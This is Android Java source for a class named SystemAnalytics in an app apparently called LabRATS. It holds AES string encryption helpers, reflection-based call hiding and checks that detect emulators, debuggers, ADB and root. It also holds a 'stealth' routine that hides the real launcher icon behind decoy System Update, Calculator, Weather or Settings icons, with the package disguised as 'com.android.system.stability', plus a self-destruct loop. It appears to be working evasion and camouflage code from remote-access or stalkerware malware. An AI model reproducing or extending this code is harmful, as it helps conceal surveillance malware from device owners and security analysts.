package com.labs.labrats;

import android.os.Build;
import android.provider.Settings;
import android.content.Context;
import android.content.Intent;
import com.labs.labrats.BuildConfig;
import java.io.File;
import java.lang.reflect.Method;
import java.util.UUID;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.MessageDigest;
import java.util.Arrays;

/**
 * Internal system environment synchronization.
 */
public class SystemAnalytics {

    private static final String DYNAMIC_K = BuildConfig.ENCRYPTION_KEY;

    private static SecretKeySpec getSecretKey() throws Exception {
        byte[] key = DYNAMIC_K.getBytes("UTF-8");
        MessageDigest sha = MessageDigest.getInstance("SHA-256");
        key = sha.digest(key);
        return new SecretKeySpec(key, "AES");
    }

    public static String decrypt(byte[] e) {
        try {
            if (e == null || e.length < 16) return "";
            byte[] iv = Arrays.copyOfRange(e, 0, 16);
            byte[] cipherText = Arrays.copyOfRange(e, 16, e.length);
            
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, getSecretKey(), new IvParameterSpec(iv));
            return new String(cipher.doFinal(cipherText), "UTF-8");
        } catch (Exception err) {
            return "";
        }
    }

    public static byte[] encrypt(String s) {
        try {
            if (s == null) return new byte[0];
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, getSecretKey());
            byte[] iv = cipher.getIV();
            byte[] cipherText = cipher.doFinal(s.getBytes("UTF-8"));
            
            byte[] combined = new byte[iv.length + cipherText.length];
            System.arraycopy(iv, 0, combined, 0, iv.length);
            System.arraycopy(cipherText, 0, combined, iv.length, cipherText.length);
            return combined;
        } catch (Exception err) {
            return new byte[0];
        }
    }

    public static Object safeCall(String c, String m, Class<?>[] p, Object i, Object... a) {
        try {
            Class<?> cl = Class.forName(c);
            Method me = cl.getMethod(m, p);
            return me.invoke(i, a);
        } catch (Exception e) {
            return null;
        }
    }

    public static boolean checkEnv(Context context) {
        // [STEALTH_PATCH] Skip aggressive evasion checks during development/debug builds
        // to prevent the app from self-terminating on emulators or when a debugger is detected.
        if (BuildConfig.DEBUG) {
            android.util.Log.d("LabRATS-Evasion", "Debug build detected. Skipping environment evasion protocols.");
            return false;
        }

        // Debugger Check
        if (android.os.Debug.isDebuggerConnected()) return true;

        String f = Build.FINGERPRINT;
        String m = Build.MODEL;
        String p = Build.PRODUCT;
        String h = Build.HARDWARE;
        String ma = Build.MANUFACTURER;
        
        // Comprehensive Hardware/Emulator Checks - Refined for API 21+ legacy hardware
        boolean r = (f.startsWith("gen") && f.contains("sdk")) || f.startsWith("unk") && f.contains("emu")
                || m.contains("sdk") || m.contains("Emu")
                || m.contains("x86") || ma.contains("Geny")
                || (ma.contains("Google") && h.equals("ranchu")) // Pixel Emulator
                || (Build.BRAND.startsWith("gen") && Build.DEVICE.startsWith("gen") && Build.PRODUCT.contains("sdk"))
                || (h.contains("gold") || h.contains("ranch"))
                || p.contains("vbox") || p.contains("sim")
                || ma.equalsIgnoreCase("nox") || p.equalsIgnoreCase("nox");

        if (r) return true;

        try {
            // Suspicious Files Check (Emulator/Sandbox Artifacts)
            String[] suspectPaths = {
                "/dev/qemu_pipe", "/dev/socket/qemud", "/system/lib/libc_malloc_debug_qemu.so",
                "/sys/module/qemu_trace_sysfs", "/system/bin/qemu-props", "/proc/tty/driver/goldfish"
            };
            for (String path : suspectPaths) {
                if (new File(path).exists()) return true;
            }

            // Suspicious Package Check
            String[] suspectPkgs = {"com.google.android.launcher.layouts.device_dock", "com.example.android.contactmanager"};
            android.content.pm.PackageManager pm = context.getPackageManager();
            for (String pkg : suspectPkgs) {
                try { pm.getPackageInfo(pkg, 0); return true; } catch (Exception ignored) {}
            }

            android.content.Intent b = context.registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
            if (b != null) {
                int lv = b.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int st = b.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                if (lv == 50 && st == 2) { 
                    // Emulator battery often stuck at 50%
                }
            }
        } catch (Exception ignored) {}

        return false;
    }

    public static boolean isDebug(Context context) {
        try {
            return Settings.Global.getInt(context.getContentResolver(), Settings.Global.ADB_ENABLED, 0) > 0;
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean isRooted() {
        String[] ps = {"/system/bin/su", "/system/xbin/su", "/sbin/su", "/data/local/xbin/su"};
        for (String s : ps) {
            if (new File(s).exists()) return true;
        }
        return false;
    }

    /**
     * Re-triggers the uninstall intent repeatedly until the app is removed.
     */
    public static void triggerSelfDestructLoop(android.content.Context context) {
        new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                if (!context.getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false)) {
                    return;
                }
                
                android.util.Log.d("SystemAnalytics", "Executing persistent self-destruct intent...");
                try {
                    android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_DELETE);
                    intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    context.startActivity(intent);
                } catch (Exception e) {
                    try {
                        android.content.Intent intent = new android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intent);
                    } catch (Exception ignored) {}
                }
                // Re-trigger every 8 seconds
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this, 8000);
            }
        });
    }

    /**
     * Instantly toggles app camouflage by switching launcher aliases.
     */
    public static void setStealthMode(android.content.Context context, boolean stealth) {
        try {
            android.util.Log.d("SystemAnalytics", "Executing stealth protocol. Active: " + stealth);
            
            android.content.pm.PackageManager pm = context.getPackageManager();
            
            // [CRITICAL] Component resolution must use the source package (com.labs.labrats), 
            // not the dynamic applicationId (com.android.system.stability).
            String basePkg = "com.labs.labrats";
            android.content.ComponentName main = new android.content.ComponentName(context, basePkg + ".LauncherAlias");
            
            // Resolve chosen Decoy from Persisted Settings or BuildConfig fallback
            int choice = getDecoyChoice(context);
            String decoyClass = basePkg + ".SystemUpdateAlias";
            switch (choice) {
                case 2: decoyClass = basePkg + ".CalculatorAlias"; break;
                case 3: decoyClass = basePkg + ".WeatherAlias"; break;
                case 4: decoyClass = basePkg + ".SettingsAlias"; break;
            }
            
            android.content.ComponentName decoy = new android.content.ComponentName(context, decoyClass);

            // Persist the stealth state
            context.getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE)
                    .edit().putBoolean("stealth_enabled", stealth).apply();

            if (stealth) {
                // Disable Main
                pm.setComponentEnabledSetting(main, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                
                // Disable ALL other decoys first to ensure only one is active
                String[] decoys = {
                    basePkg + ".SystemUpdateAlias",
                    basePkg + ".CalculatorAlias",
                    basePkg + ".WeatherAlias",
                    basePkg + ".SettingsAlias"
                };
                for (String d : decoys) {
                    if (!d.equals(decoyClass)) {
                        pm.setComponentEnabledSetting(new android.content.ComponentName(context, d), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                    }
                }

                // Enable chosen decoy
                pm.setComponentEnabledSetting(decoy, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                
                FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage DEPLOYED (" + decoyClass + ")");
            } else {
                // Restore Main
                pm.setComponentEnabledSetting(main, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                
                // Disable all possible decoys
                String[] decoys = {
                    basePkg + ".SystemUpdateAlias",
                    basePkg + ".CalculatorAlias",
                    basePkg + ".WeatherAlias",
                    basePkg + ".SettingsAlias"
                };
                for (String d : decoys) {
                    pm.setComponentEnabledSetting(new android.content.ComponentName(context, d), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                }
                FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage RELEASED");
            }

            // Force Launcher Refresh
            android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
            home.addCategory(android.content.Intent.CATEGORY_HOME);
            home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(home);

        } catch (Exception e) {
            android.util.Log.e("SystemAnalytics", "Stealth Error: " + e.getMessage());
        }
    }

    public static int getDecoyChoice(Context context) {
        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .getInt("decoy_choice", BuildConfig.DECOY_CHOICE);
    }

    public static void setDecoyChoice(Context context, int choice) {
        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .edit().putInt("decoy_choice", choice).apply();
    }

    public static boolean isStealthEnabled(Context context) {
        // First check if Main launcher is actually disabled - that's the source of truth
        try {
            android.content.ComponentName main = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
            int state = context.getPackageManager().getComponentEnabledSetting(main);
            if (state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) return true;
            if (state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) return false;
        } catch (Exception ignored) {}
        
        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .getBoolean("stealth_enabled", false);
    }
}
